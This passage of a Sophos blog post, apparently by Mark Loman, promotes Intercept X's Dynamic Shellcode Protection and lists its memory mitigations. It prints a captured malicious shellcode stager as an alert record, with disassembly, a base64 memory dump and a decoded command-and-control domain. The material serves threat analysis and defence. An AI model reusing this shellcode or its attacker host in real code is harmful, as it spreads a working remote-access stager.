<figure id="attachment_73059" aria-describedby="caption-attachment-73059" style="width: 1280px" class="wp-caption aligncenter"><a href="https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png"><img loading="lazy" class="wp-image-73059 size-full" src="https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png" alt="" width="1280" height="500" srcset="https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png 1280w, https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png?resize=300,117 300w, https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png?resize=768,300 768w, https://news.sophos.com/wp-content/uploads/2021/03/HHH-edit.png?resize=1024,400 1024w" sizes="(max-width: 1280px) 100vw, 1280px" /></a><figcaption id="caption-attachment-73059" class="wp-caption-text">Figure 6 &#8211; Memory allocation behavior of staged payloads</figcaption></figure>
<h2><span lang="EN-US">Paradigm Shift</span></h2>
<p>In a multi-year project called &#8220;HeapHeapHooray&#8221;, Sophos designed a new practical protection that blocks this malicious memory allocation behavior, while being highly compatible with existing applications.</p>
<p>The end result is a system-level mitigation, called “Dynamic Shellcode Protection,” with a code-agnostic design and the ability to intercept many cyberattacks involving remote access trojans, fileless malware and ransomware.</p>
<p>In recent attacks, our early-access customers have seen first-hand the effectiveness of this protection. When a process violates the memory allocation barrier imposed by the Dynamic Shellcode Protection, the mitigation generates an alert with a run-length encoded base64 memory dump from the memory region where the allocation call originated from. This data can provide threat responders with insight into the breach and help them to quickly trace the initial access and where the attack is operated from (its command-and-control server).</p>
<p>MitigationL DynamicShellcode</p>
<p>Timestamp: 2021-01-15T05:50:38</p>
<p>Platform: 10.0.14393/x64 v321 06_3f*</p>
<p>PID: 2856</p>
<p>Application: C:\Windows\System32\rundll32.exe</p>
<p>Created: 2016-07-16T13:19:06</p>
<p>Modified: 2016-07-16T13:19:06</p>
<p>Description: Windows host process (Rundll32) 10</p>
<p>Shellcode: (HHA) (0x00400000 bytes)</p>
<p>Owner of CALLER: (anonymous; doc.dll)</p>
<p>OwnerModule</p>
<p>Name: doc.dll</p>
<p>Thumbprint: 9be4c0089b841d45871f054cb797f099f2a89d71d6158110f1e3a78cb9a9e3ae</p>
<p>SHA-256: 2cd05616874445c655eaf723c549f35cc6c379b1877750788adf2c5d6b86cd09</p>
<p>SHA-1: c7bcb3b84244a22e6ee9699cfbd86dc9f27fc677</p>
<p>MD5: c5e8007b5fa2e25625d659fa5c6604ff</p>
<table style="height: 1066px" width="906">
<tbody>
<tr>
<td width="200">0000024F0AEE034B  ffd5</td>
<td width="200">CALL</td>
<td width="200">RBP</td>
</tr>
<tr>
<td width="200">0000024F0AEE034D  4893</td>
<td width="200">XCHG</td>
<td width="200">RBX, RAX</td>
</tr>
<tr>
<td width="200">0000024F0AEE034F  53</td>
<td width="200">PUSH</td>
<td width="200">RBX</td>
</tr>
<tr>
<td width="200">0000024F0AEE0350  53</td>
<td width="200">PUSH</td>
<td width="200">RBX</td>
</tr>
<tr>
<td width="200">0000024F0AEE0351  4889e7</td>
<td width="200">MOV</td>
<td width="200">RDI, RSP</td>
</tr>
<tr>
<td width="200">0000024F0AEE0354  4889f1</td>
<td width="200">MOV</td>
<td width="200">RCX, RSI</td>
</tr>
<tr>
<td width="200">0000024F0AEE0357  4889da</td>
<td width="200">MOV</td>
<td width="200">RDX, RBX</td>
</tr>
<tr>
<td width="200">0000024F0AEE035A  41b800200000</td>
<td width="200">MOV</td>
<td width="200">R8D, 0x2000</td>
</tr>
<tr>
<td width="200">0000024F0AEE0360  4989f9</td>
<td width="200">MOV</td>
<td width="200">R9, RDI</td>
</tr>
<tr>
<td width="200">0000024F0AEE0363  41ba129689e2</td>
<td width="200">MOV</td>
<td width="200">R10D, 0xe2899612</td>
</tr>
<tr>
<td width="200">0000024F0AEE0369  ffd5</td>
<td width="200">CALL</td>
<td width="200">RBP</td>
</tr>
<tr>
<td width="200">0000024F0AEE036B  4883c420</td>
<td width="200">ADD</td>
<td width="200">RSP, 0x20</td>
</tr>
<tr>
<td width="200">0000024F0AEE036F  85c0</td>
<td width="200">TEST</td>
<td width="200">EAX, EAX</td>
</tr>
<tr>
<td width="200">0000024F0AEE0371  74b6</td>
<td width="200">JZ</td>
<td width="200">0x24f0aee0329</td>
</tr>
<tr>
<td width="200">0000024F0AEE0373  668b07</td>
<td width="200">MOV</td>
<td width="200">AX, [RDI]</td>
</tr>
<tr>
<td width="200">0000024F0AEE0376  4801c3</td>
<td width="200">ADD</td>
<td width="200">RBX, RAX</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>&#8212;&#8211; SNIP HERE &#8212;&#8211;<br />
<textarea rows="18">AAIOAQAA7gpPAgAASwPuCk8CAAAAAO4KTwIAAAAQAAD8SIPk8OjIDgMAQVFBUFJRVkgx0mVIi1JgSItSGEiLUiBIi3JQSA+3DgJKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiA4DAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulPDgP/XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xpkw4DAFpIicFBuLsBDgIATTHJQVFBUWoDQVFBuleJn8b/1et5W0iJwUgx0kmJ2E0xyVJoADLAhA4CUkG661UuO//VSInGSIPDUGoKX0iJ8bofDgMAagBogDMOAgBJieBBuQQOAwBBunVGnob/1UiJ8UiJ2knHwA4E/00xyQ4CUkG6LQYYe//VhcAPhZ0BDgIASP/PD4SMAQ4CAOuz6eQBDgIA6IIOA/8vTWVudXMuYXNweAAD6cusyNUwjjrWtMTbABgS/nsnMcOSGR308Ue/xxjSIl01ZrdvCey55Dvip5rkk3lcXVEAoa30r5R0aERROxJwfH44AEEOAmNlcHQ6ICovKg0KQQ4CY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNClJlZmVyZXI6IGgOAnRwczoOAi9sb2NhdGlvbnMuc21hc2hidXJnZXIuY29tL3VzL2t5L2xvdWlzdmkOAmxlLzMxMi1zLWZvdXJ0aC1zdC5odG1sDQpDbw4CbmVjdGlvbjogY2xvc2UNClVzZXItQWdlbnQ6IE1vemkOAmxhLzUuMCAoV2luZG93cyBOVCA2LjEpIEEOAnBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKQ0KAAFSomUgNN/Fpj85+68m1E6vXto0Is5f9m00XycOAt5ShaswYtsaeU8mSXVHb32RhkEIDM/lsy4LfddL9gQ0p/fQxRnWDgLklnCe/T8AQb7wtaJW/9VIMcm6DgIAQABBuAAQDgIAQblADgMAQbpYpFPl/9VIkw4CU0iJ50iJ8UiJ2kG4ACAOAgBJiflBuhKWieL/1UiDxCCFwHS2ZosHSAHDhcB11w4DWEgFDgQAUMPof/0OAv9kb2Nucy5jb20AXi54hg4AAA4AAA4AAA4AAA4AAA4AAA4AAA4AAA4AAA4AAA4AAA4AAA5lAA==</textarea><br />
&#8212;&#8211; END SNIP &#8212;&#8211;</p>
<p>&nbsp;</p>
<p>Loaded Modules</p>
<p>&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;</p>
<p>00007FF8D34A0000-00007FF8D35D2000 hmpalert.dll (SurfRight B.V.),</p>
<p>version: 3.7.17.317</p>
<p>0000000065180000-00000000651BA000 doc.dll (),</p>
<p>version:</p>
<p>00007FF8C9AA0000-00007FF8C9ADE000 SOPHOS~1.DLL (Sophos Limited),</p>
<p>version: 10.8.9.610</p>
<p>Process Trace</p>
<p>1  C:\Windows\System32\rundll32.exe [2856]</p>
<p>rundll32.exe C:\Programdata\doc.dll entryPoint</p>
<p>2  C:\Windows\System32\wbem\WmiPrvSE.exe [4636]</p>
<p>C:\Windows\system32\wbem\wmiprvse.exe -secured -Embedding</p>
<p>3  C:\Windows\System32\svchost.exe [748]</p>
<p>C:\Windows\system32\svchost.exe -k DcomLaunch</p>
<p>4  C:\Windows\System32\services.exe [656]</p>
<p>5  C:\Windows\System32\wininit.exe [552]</p>
<p>wininit.exe</p>
<p>6  C:\Windows\System32\smss.exe [452]</p>
<p>\SystemRoot\System32\smss.exe 000000d4 0000007c</p>
<p>7  C:\Windows\System32\smss.exe [360]</p>
<p>\SystemRoot\System32\smss.exe</p>
<p>Thumbprint</p>
<p>7eba537e2dd90dded5c4950f939fbe9a9678b33f840382136d317550ea65a926</p>
<p>Module based thumbprint</p>
<p>9be4c0089b841d45871f054cb797f099f2a89d71d6158110f1e3a78cb9a9e3ae</p>
<p>&nbsp;</p>
<p>Decoding the run-length and base64 encoded memory dump results in the following human-readable strings:</p>
<p>/Menus.aspx</p>
<p>Accept-Language: en-US,en;q=0.5</p>
<p>Referer: https://locations[.]smashburger.com/us/ky/louisville/312-s-fourth-st.html</p>
<p>User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko)</p>
<p>docns.com</p>
<h2><span lang="EN-US">Dynamic Shellcode Protection</span></h2>
<p>In January 2021, we started enabling this protection across our customer base running Sophos Intercept X. The novel protection is signature-agnostic, meaning it does not make assumptions on the memory allocation, i.e., whether it is for a benign or malicious purpose – while being highly compatible with existing applications.</p>
<p>The protection is not meant as a silver bullet for all attacks but is expected to make a significant impact on the threat landscape. Just as not all machine learning systems are equal, not all memory protections are equal, either. We believe our unique Dynamic Shellcode Protection will have a considerable impact as adversaries now face a defense that blocks a fundamental behavior of their covert remote access agents.</p>
<p>The Dynamic Shellcode Protection does not rely on the cloud or machine learning and as such is a paradigm shift in the battle against many obfuscated malware and memory-delivered post-exploitation agents, including Cobalt Strike Beacon.</p>
<p>Note: In attacks with Cobalt Strike Beacon, more of its fileless in-memory techniques can be observed. For example, the Sophos APCViolation protection blocks Beacon’s code injection when it attempts to run a capability in the address space of another process via an asynchronous procedure call (APC) – <a href="https://attack.mitre.org/techniques/T1055/004/">MITRE ATT&amp;CK T1055.004</a>. APC injection is regularly used because many endpoint protection products have no visibility into this event. Dynamic Shellcode Protection aims to undermine the fundamental behaviors of remote access agents that make hand-on-keyboard attacks possible from remote.</p>
<h2><span lang="EN-US">Mitigation Robustness</span></h2>
<p>The Sophos Threat Mitigation team (the team behind HitmanPro and HitmanPro.Alert) has introduced many other novel mitigations against attack techniques observed in the field.</p>
<p>Incorporated into Sophos Intercept X, these mitigations are designed to prevent and limit the effects of arbitrary code execution. They do this by monitoring for undesired behaviors, i.e., commands executed by the kernel via functions that are fundamentally required to manipulate data on disk or memory – in both unknown and trusted applications. These mitigations are uniquely robust. They survive obfuscations by being signature-agnostic, which means they do not rely on brittle machine code inspection to detect attacks. Also, these technologies do not rely on the cloud or machine learning.</p>
<p>The following table is a list of all current Sophos proprietary mitigations that Sophos Intercept X <u>adds</u> to Windows 10. Contrary to Windows 10 Exploit Guard, the mitigations offered by Sophos are different, highly compatible, default enabled, and do not require configuration.</p>
<p>&nbsp;</p>
<table width="602">
<tbody>
<tr>
<td width="340"><strong>Description</strong></td>
<td width="113"><strong>Module</strong></td>
<td width="0"><strong>Level</strong></td>
<td width="73"><strong>Equivalent in Windows 10</strong></td>
</tr>
<tr>
<td width="340">Enforce Data Execution Prevention (DEP)</td>
<td width="113">DEP</td>
<td width="0">Application</td>
<td width="73">Yes</td>
</tr>
<tr>
<td width="340">Mandatory ASLR on modules</td>
<td width="113">DEP (ASLR)</td>
<td width="0">Application</td>
<td width="73">Yes</td>
</tr>
<tr>
<td width="340">Bottom-up ASLR</td>
<td width="113">DEP (ASLR)</td>
<td width="0">Application</td>
<td width="73">Yes</td>
</tr>
<tr>
<td width="340">Validate exception chains</td>
<td width="113">SEHOP</td>
<td width="0">Application</td>
<td width="73">Yes</td>
</tr>
<tr>
<td width="340">Validate API invocation</td>
<td width="113">ROP</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Prevent API invocation from stack memory</td>
<td width="113">CallerCheck</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent process creation from dynamic memory</td>
<td width="113">CallerCheck</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Import address filtering (IAF)</td>
<td width="113">IAF</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Validate stack integrity</td>
<td width="113">StackPivot</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Validate stack memory protection</td>
<td width="113">StackExec</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Validate heap content integrity</td>
<td width="113">HeapSpray</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Block memory addresses commonly abused for heap spraying</td>
<td width="113">HeapSpray</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Block remote images</td>
<td width="113">LoadLib</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Prevent code injection via reflective DLL</td>
<td width="113">LoadLib</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Prevent vtable hijacking in Flash Player</td>
<td width="113">VTableHijack</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Enforce sandbox around VBScript in Internet Explorer</td>
<td width="113">Lockdown</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent DLL hijacking on web downloads</td>
<td width="113">DllHijack</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent application from executing of newly created executable content</td>
<td width="113">Lockdown</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent application from using living-of-the-land binaries</td>
<td width="113">Lockdown</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent application from creating autorun registry entry</td>
<td width="113">Lockdown</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent Win32 API calls from Office macro</td>
<td width="113">Lockdown</td>
<td width="0">Application</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Prevent inspection bypass via unsupervised system calls</td>
<td width="113">SysCall</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent inspection bypass via WoW64 marshalling layer</td>
<td width="113">SysCall</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent inspection bypass via Heaven&#8217;s Gate</td>
<td width="113">SysCall</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Validate web browser integrity</td>
<td width="113">Intruder</td>
<td width="0">Application</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Ransomware protection with data rollback, folder-agnostic</td>
<td width="113">CryptoGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Block ransomware that abuses Windows EFS</td>
<td width="113">CryptoGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Boot and volume record overwrite protection</td>
<td width="113">WipeGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent intersectional control flow</td>
<td width="113">CodeCave</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent code execution from residual memory beyond the image size</td>
<td width="113">CodeCave</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent overwriting of the entry-point from dynamic memory</td>
<td width="113">CodeCave</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent privilege escalation via token theft</td>
<td width="113">PrivGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent privilege escalation via secondary logon handler</td>
<td width="113">PrivGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent credential theft via LSASS</td>
<td width="113">CredGuard</td>
<td width="0">System</td>
<td width="73">Optional</td>
</tr>
<tr>
<td width="340">Prevent APC violation</td>
<td width="113">APCViolation</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent abuse of atom tables via APC</td>
<td width="113">APCViolation</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Stop module load order disrespect via deception</td>
<td width="113">Kernel32Trap</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent process hollowing</td>
<td width="113">HollowProcess</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent process environment block manipulation</td>
<td width="113">HollowProcess</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent main thread hijacking</td>
<td width="113">HollowProcess</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Validate CTF protocol caller</td>
<td width="113">CTFGuard</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent dynamic shellcode</td>
<td width="113">DynamicShellcode</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent dynamic shellcode from other processes</td>
<td width="113">DynamicShellcode</td>
<td width="0">System</td>
<td width="73">&#8211;</td>
</tr>
<tr>
<td width="340">Prevent in-memory manipulation of AMSI.DLL</td>
<td width="113">AmsiGuard</td>
<td width="0">System</td>
<td width="73">
<p style="text-align: center">&#8211;</p>
</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
			</div><!-- .entry-content -->

</article><!-- #post-## -->

					<nav class="navigation post-navigation" role="navigation">
			<h2 class="screen-reader-text">Post navigation</h2>
			<div class="nav-links">
	   			<div class="nav-previous">
											<span class="nav-label">Prev</span>
						<a href="https://news.sophos.com/en-us/2021/03/03/understanding-xdr-the-latest-evolution-in-threat-detection-and-response/" rel="prev">Understanding XDR, the latest evolution in threat detection and response</a>
						   			</div>
	   			<div class="nav-next">
											<span class="nav-label">Next</span>
						<a href="https://news.sophos.com/en-us/2021/03/04/stopping-gootloader-with-sophos-intercept-x/" rel="next">Stopping Gootloader with Sophos Intercept X</a>
						   			</div>
		 	</div><!-- .nav-links -->
		</nav><!-- .navigation -->
		
			<div class="article-author-block article-co-authors-block">
	
					<h2 class="author-title">
				About the Author			</h2>
		
					<div class="author-block-container">
				<div class="author-profile">
					<img width="145" height="145" src="https://news.sophos.com/wp-content/uploads/2020/02/mark-loman.png?w=145" class="avatar avatar-145 photo wp-post-image" alt="" />				</div> <!-- .author-profile -->

				<div class="author-description">
					<h3 class="author-name"><a href="https://news.sophos.com/en-us/author/mark-loman/" title="Posts by Mark Loman" class="author url fn" rel="author">Mark Loman</a></h3>

					
					<div class="author-bio">
						<p>Mark Loman is a Director, Engineering, for Next-Gen Technologies at Sophos. As an ethical hacker with a passion for information security, Loman oversees a team of experienced developers responsible for delivering practical signature-less solutions. With more than 10 years of experience, Loman has a keen eye for innovating effective solutions and technology that stop zero-day cyberthreats. With in-depth knowledge of the intricate workings of modern computers and applications, Loman’s team isn’t shy when applying unconventional methods to test and create prevention techniques to battle even persistent attackers.</p>
					</div> <!-- .author-bio -->
				</div> <!-- .author-description -->
			</div> <!-- .author-block-container -->
			</div>

			
<div id="comments" class="comments-area">

	
	
	
		<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/#respond" style="display:none;">Cancel reply</a></small></h3><form action="https://news.sophos.com/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span></p><p class="comment-form-comment"><label for="comment">Comment</label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required="required"></textarea></p><p class="comment-form-author"><label for="author">Name</label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" /></p>
<p class="comment-form-email"><label for="email">Email</label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" /></p>
<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" /></p>
<p class="comment-form-cookies-consent"><input id="wp-comment-cookies-consent" name="wp-comment-cookies-consent" type="checkbox" value="yes" /> <label for="wp-comment-cookies-consent">Save my name, email, and website in this browser for the next time I comment.</label></p>
<input type="hidden" name="redirect_to" value="https://news.sophos.com/en-us/2021/03/04/covert-code-faces-a-heap-of-trouble-in-memory/" id="redirect_to"><p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='73028' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="e53799cae1" /></p><input type="hidden" id="ak_js" name="ak_js" value="55"/><textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100" style="display: none !important;"></textarea></form>	</div><!-- #respond -->
	
</div><!-- #comments -->

		
		</main><!-- #main -->
	</div><!-- #primary -->


<div id="secondary" class="widget-area" role="complementary">
			
		<div id="second-article-wrapper" class="article-wrapper">
			<h3 class="widget-title">You might also enjoy...</h3>
			<article id="post-72266" class="second-featured post-72266 post type-post status-publish format-standard has-post-thumbnail hentry category-mtr category-security-operations tag-mtr tag-ransomware tag-sidebar tag-sophos-managed-threat-response-mtr tag-sophos-mtr region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v3.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">03</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/mtr/">MTR</a> &bull; <a href="https://news.sophos.com/en-us/category/security-operations/">Security Operations</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/03/mtr-casebook-uncovering-a-backdoor-implant-in-a-solarwinds-orion-server/" rel="bookmark">MTR casebook: Uncovering a backdoor implant in a SolarWinds Orion server</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72321" class="second-featured post-72321 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-sidebar tag-zero-trust tag-ztna region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2021/02/ZTNA-header.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">02</span>
				<span class="month">Feb</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/02/02/sophos-zero-trust-network-access-ztna-is-coming-soon/" rel="bookmark">Sophos zero trust network access (ZTNA) is coming soon</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-72021" class="second-featured post-72021 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-mtr tag-rapid-response tag-sidebar tag-sophos-mtr tag-sophos-rapid-response region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/08/sophos-news-ft-img-mtr_v1.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">19</span>
				<span class="month">Jan</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2021/01/19/451-research-impact-report-on-sophos-rapid-response-service/" rel="bookmark">451 Research Impact Report on Sophos Rapid Response service</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
<article id="post-71626" class="second-featured post-71626 post type-post status-publish format-standard has-post-thumbnail hentry category-products tag-edr tag-intercept-x-advanced-for-server-with-edr tag-intercept-x-with-edr tag-live-discover tag-sidebar region-en-us">
	<div class="second-featured__image" style="background-image: url('https://news.sophos.com/wp-content/uploads/2020/12/APIs-hero.png?w=640');">
		<div class="featured-entry-meta">
			<div class="featured-entry-date">
				<span class="day-num">17</span>
				<span class="month">Dec</span>
			</div>
		</div>
	</div>
	<div class="second-featured__content">
		<header class="featured-entry-header">
			<div class="featured-entry-categories">
					<a href="https://news.sophos.com/en-us/category/products/">Sophos Products</a>			</div>
			<h1 class="featured-entry-title dot-ellipsis dot-resize-update dot-load-update dot-height-130"><a href="https://news.sophos.com/en-us/2020/12/17/sophos-edr-live-discover-apis-are-now-generally-available/" rel="bookmark">Sophos EDR Live Discover APIs are now generally available</a></h1>		</header> <!-- featured-entry-header -->
	</div>
</article> <!-- post -->
		</div>

	</div> <!-- #secondary -->


		</div> <!-- .container -->
	</div> <!-- #content -->
	<footer>
		<section class="cta">
			<p>Start a Sophos demo in less than a minute. See exactly how our solutions work in a full environment without a commitment.</p>
			<a href="https://secure2.sophos.com/en-us/products/demos.aspx?cmp=70130000001xKqzAAE">Learn More</a>
		</section>
		<section class="connected">
			<div class="social">
				<h3>Stay Connected</h3>
				<ul>
					<li><a href="https://www.facebook.com/securitybysophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/facebook-icon.svg?la=en&amp;hash=1CA0A5A0E9C9999E7E079A5D32C86E9BF9C7AD1E" alt="Facebook"></a>
					</li>
					<li><a href="https://www.instagram.com/sophossecurity/" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/instagram-icon.svg?la=en&amp;hash=2B50C2B67C3023D9E7D4E1C3A16401EAD8F10F76" alt="Instagram"></a>
					</li>
					<li><a href="https://www.linkedin.com/company/sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/linkedin-icon.svg?la=en&amp;hash=B6D5378C1E1A16F239A4C862EAE3499B8EC1F3F9" alt="LinkedIn"></a></li>
					<li><a href="https://www.sophos.com/en-us/company/rss-feeds.aspx"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/rss-icon.svg?la=en&amp;hash=76C4DAFD331DC675814191A66794A778D8C6DCF7" alt="RSS"></a></li>
					<li><a href="https://twitter.com/Sophos" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/twitter-icon.svg?la=en&amp;hash=9A90D9F99ABE6454741BBAAF9C3FB6966624C92D" alt="Twitter"></a></li>
					<li><a href="https://www.youtube.com/user/SophosProducts" target="_blank"><img src="https://www.sophos.com/en-us/medialibrary/SophosNext/Images/Navigation/Footer/youtube-icon.svg?la=en&amp;hash=CCCF647AFA78C8DB74D654DB9FEFBF0AC54F42D3" alt="YouTube"></a></li>
				</ul>
			</div>
			<ul class="links">
				<li><a href="https://www.sophos.com/en-us/company/careers.aspx">Careers </a></li>
				<li><a href="https://www.sophos.com/en-us/partners/partner-locator.aspx">Find a Partner</a></li>
				<li><a href="https://secure2.sophos.com/en-us/support.aspx">Support</a></li>
				<li><a href="https://www.sophos.com/en-us/threat-center/technical-papers.aspx">Technical Papers</a></li>
				<li><a href="https://www.sophos.com/en-us/security-news-trends/whitepapers.aspx">Whitepapers</a></li>
			</ul>
		</section>
		<section class="legal">
			<div class="copyright">&copy; 1997 - 2021 Sophos Ltd. All rights reserved</div>
			<ul>
				<li><a href="https://www.sophos.com/en-us/legal.aspx">Legal</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/sophos-group-privacy-policy.aspx">Privacy</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/cookie-information.aspx">Cookie Information</a></li>
				<li><a href="https://www.sophos.com/en-us/legal/modern-slavery-act-transparency-statement.aspx">Modern Slavery Statement</a></li>
			</ul>
		</section>
		<div class="vip" style="background: #002939">
			Powered by <a href="https://wpvip.com/?utm_source=vip_powered_wpcom&#038;utm_medium=web&#038;utm_campaign=VIP%20Footer%20Credit&#038;utm_term=news.sophos.com" rel="generator nofollow" class="powered-by-wpcom">WordPress VIP</a>		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
